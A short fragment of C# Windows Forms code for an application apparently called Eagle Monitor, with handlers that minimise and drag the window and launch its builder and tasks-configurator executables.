        private void minimizeButton_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void label1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }

        private void pictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.FindForm().Handle, 161, 2, 0);
        }

        private void builderToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            Process.Start(Application.StartupPath + "\\Eagle Monitor Builder.exe");
        }

        private void tasksConfiguratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Process.Start(Application.StartupPath + "\\Eagle Monitor Tasks Configurator.exe").WaitForExit(-1);
            StartupTaskHandler.CheckSettingsAgain();
        }

    }
}
